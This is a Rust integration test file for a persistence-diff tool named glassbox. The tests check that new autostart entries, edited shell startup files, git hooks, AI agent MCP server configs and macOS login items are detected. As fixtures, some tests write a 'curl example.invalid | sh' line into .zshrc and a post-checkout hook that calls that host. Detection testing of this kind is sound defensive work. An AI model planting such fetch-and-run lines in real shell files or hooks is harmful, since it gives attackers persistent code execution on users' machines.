//! Persistence diff tests against real files in a temporary home. No mocks.
use glassbox::sha256;
use std::fs;
use std::path::{Path, PathBuf};
use std::process::{Command, Output};

mod common;

fn scratch(name: &str) -> PathBuf {
    let dir = std::env::temp_dir().join(format!("glassbox-persist-{}-{name}", std::process::id()));
    let _ = fs::remove_dir_all(&dir);
    fs::create_dir_all(&dir).unwrap();
    dir
}

fn glassbox(args: &[&str], home: &Path) -> Output {
    Command::new(env!("CARGO_BIN_EXE_glassbox")).arg("persist").args(args).arg("--home").arg(home).output().unwrap()
}

fn save(home: &Path) -> PathBuf {
    let snap = home.with_extension("snapshot");
    let out = glassbox(&["--save", snap.to_str().unwrap()], home);
    assert_eq!(out.status.code(), Some(0), "{}", String::from_utf8_lossy(&out.stderr));
    snap
}

/// (exit code, JSON) of `persist --since SNAP --strict --json`.
fn since(home: &Path, snap: &Path) -> (i32, String) {
    let out = glassbox(&["--since", snap.to_str().unwrap(), "--strict", "--json"], home);
    common::home_only((out.status.code().unwrap(), String::from_utf8(out.stdout).unwrap()))
}

/// A per-user location that runs a program at login on this platform.
fn autostart_entry(home: &Path) -> (PathBuf, &'static str) {
    if cfg!(target_os = "macos") {
        (home.join("Library/LaunchAgents/com.example.agent.plist"), "~/Library/LaunchAgents/com.example.agent.plist")
    } else {
        (home.join(".config/systemd/user/example.service"), "~/.config/systemd/user/example.service")
    }
}

#[test]
fn sha256_matches_fips_180_2_vectors() {
    assert_eq!(sha256::hex(b""), "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855");
    assert_eq!(sha256::hex(b"abc"), "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad");
    assert_eq!(
        sha256::hex(b"abcdbcdecdefdefgefghfghighijhijkijkljklmklmnlmnomnopnopq"),
        "248d6a61d20638b8e5c026930c3e6039a33ce45964ff2167f6ecedd419db06c1"
    );
    assert_eq!(
        sha256::hex(&vec![b'a'; 1_000_000]),
        "cdc76e5c9914fb9281a1c7e284d73e67f1809a48a497200e046d39ccc7112cd0"
    );
}

#[test]
fn no_change_passes_strict() {
    let home = scratch("unchanged");
    fs::write(home.join(".zshrc"), "export A=1\n").unwrap();
    let snap = save(&home);
    let (code, json) = since(&home, &snap);
    assert_eq!(code, 0, "{json}");
    assert_eq!(json.trim(), r#"{"changes":[]}"#);
}

#[test]
fn new_autostart_entry_and_edited_shell_file_fail_strict() {
    let home = scratch("agent-run");
    fs::write(home.join(".zshrc"), "export A=1\n").unwrap();
    let snap = save(&home);
    let (entry, shown) = autostart_entry(&home);
    fs::create_dir_all(entry.parent().unwrap()).unwrap();
    fs::write(&entry, "run me at login").unwrap();
    fs::write(home.join(".zshrc"), "export A=1\ncurl example.invalid | sh\n").unwrap();
    let (code, json) = since(&home, &snap);
    assert_eq!(code, 1, "{json}");
    assert!(json.contains(&format!("\"change\":\"added\",\"category\":\"autostart\",\"path\":\"{shown}\"")), "{json}");
    assert!(json.contains("\"change\":\"changed\",\"category\":\"shell startup\",\"path\":\"~/.zshrc\""), "{json}");
}

#[test]
fn touching_without_changing_content_is_not_a_change() {
    let home = scratch("touch");
    fs::write(home.join(".bashrc"), "alias ll='ls -l'\n").unwrap();
    let snap = save(&home);
    std::thread::sleep(std::time::Duration::from_millis(20));
    fs::write(home.join(".bashrc"), "alias ll='ls -l'\n").unwrap();
    let (code, json) = since(&home, &snap);
    assert_eq!((code, json.trim()), (0, r#"{"changes":[]}"#));
}

#[test]
fn removal_is_reported_but_does_not_fail_strict() {
    let home = scratch("removed");
    fs::write(home.join(".profile"), "PATH=$PATH:/opt/bin\n").unwrap();
    let snap = save(&home);
    fs::remove_file(home.join(".profile")).unwrap();
    let (code, json) = since(&home, &snap);
    assert_eq!(code, 0, "{json}");
    assert!(json.contains("\"change\":\"removed\",\"category\":\"shell startup\",\"path\":\"~/.profile\""), "{json}");
}

#[test]
fn claude_json_counters_are_ignored_but_mcp_servers_are_not() {
    let home = scratch("claude");
    fs::write(home.join(".claude.json"), r#"{"numStartups":1,"projects":{"/w":{"lastCost":0.1}}}"#).unwrap();
    let snap = save(&home);
    fs::write(home.join(".claude.json"), r#"{"projects":{"/w":{"lastCost":0.9}},"numStartups":2}"#).unwrap();
    assert_eq!(since(&home, &snap), (0, "{\"changes\":[]}\n".to_string()));
    fs::write(
        home.join(".claude.json"),
        r#"{"numStartups":3,"projects":{"/w":{"mcpServers":{"x":{"command":"/tmp/x"}}}}}"#,
    )
    .unwrap();
    let (code, json) = since(&home, &snap);
    assert_eq!(code, 1, "{json}");
    assert!(json.contains("\"category\":\"agent config\",\"path\":\"~/.claude.json#mcpServers,hooks\""), "{json}");
}

#[test]
fn repo_git_hooks_are_watched_with_repo_option() {
    let home = scratch("repo-home");
    let repo = scratch("repo");
    fs::create_dir_all(repo.join(".git/hooks")).unwrap();
    let snap = home.with_extension("snapshot");
    let run = |args: &[&str]| {
        Command::new(env!("CARGO_BIN_EXE_glassbox"))
            .arg("persist").args(args).arg("--home").arg(&home).arg("--repo").arg(&repo).output().unwrap()
    };
    assert_eq!(run(&["--save", snap.to_str().unwrap()]).status.code(), Some(0));
    fs::write(repo.join(".git/hooks/post-checkout"), "#!/bin/sh\ncurl example.invalid\n").unwrap();
    let out = run(&["--since", snap.to_str().unwrap(), "--strict", "--json"]);
    let (code, json) = common::home_only((out.status.code().unwrap(), String::from_utf8(out.stdout).unwrap()));
    assert_eq!(code, 1, "{json}");
    assert!(json.contains("\"category\":\"git hook\"") && json.contains("post-checkout"), "{json}");
}

#[test]
fn snapshot_of_missing_file_is_a_usage_error() {
    let home = scratch("nosnap");
    let out = glassbox(&["--since", home.join("absent.snapshot").to_str().unwrap()], &home);
    assert_eq!(out.status.code(), Some(2));
}

/// An app bundle's own launchd plists and login-item helpers, registered with SMAppService.
#[cfg(target_os = "macos")]
#[test]
fn app_bundled_background_services_and_login_items_are_watched() {
    let home = scratch("app-bundle");
    fs::create_dir_all(home.join("Applications/Existing.app/Contents")).unwrap();
    let snap = save(&home);
    let lib = home.join("Applications/Fake.app/Contents/Library");
    for (rel, body) in [
        ("LaunchAgents/com.example.helper.plist", "agent"),
        ("LaunchDaemons/com.example.daemon.plist", "daemon"),
        ("LoginItems/Helper.app/Contents/Info.plist", "helper"),
    ] {
        fs::create_dir_all(lib.join(rel).parent().unwrap()).unwrap();
        fs::write(lib.join(rel), body).unwrap();
    }
    let (code, json) = since(&home, &snap);
    assert_eq!(code, 1, "{json}");
    let base = "~/Applications/Fake.app/Contents/Library";
    for (cat, rel) in [
        ("autostart", "LaunchAgents/com.example.helper.plist"),
        ("system service", "LaunchDaemons/com.example.daemon.plist"),
        ("login items", "LoginItems/Helper.app/Contents/Info.plist"),
    ] {
        assert!(json.contains(&format!("\"change\":\"added\",\"category\":\"{cat}\",\"path\":\"{base}/{rel}\"")), "{json}");
    }
}

/// A symlink named like an app bundle is not followed: it could point anywhere on disk.
#[cfg(target_os = "macos")]
#[test]
fn symlinked_app_bundle_is_not_followed() {
    let home = scratch("app-symlink");
    let target = scratch("app-symlink-target");
    fs::create_dir_all(target.join("Contents/Library/LaunchAgents")).unwrap();
    fs::write(target.join("Contents/Library/LaunchAgents/x.plist"), "x").unwrap();
    fs::create_dir_all(home.join("Applications")).unwrap();
    std::os::unix::fs::symlink(&target, home.join("Applications/Link.app")).unwrap();
    let out = glassbox(&["--json"], &home);
    assert!(!String::from_utf8_lossy(&out.stdout).contains("Link.app"));
}

/// The Background Task Management database records every registration and approval.
#[cfg(target_os = "macos")]
#[test]
fn background_task_database_is_hashed_when_readable() {
    let dir = Path::new("/private/var/db/com.apple.backgroundtaskmanagement");
    let readable: Vec<String> = fs::read_dir(dir)
        .map(|it| it.flatten().filter(|e| fs::File::open(e.path()).is_ok()).map(|e| e.path().display().to_string()).collect())
        .unwrap_or_default();
    let home = scratch("btm");
    let out = String::from_utf8(glassbox(&["--json"], &home).stdout).unwrap();
    for path in readable {
        assert!(out.contains(&format!("\"category\":\"login items\",\"path\":\"{path}\"")), "{path} missing: {out}");
    }
}
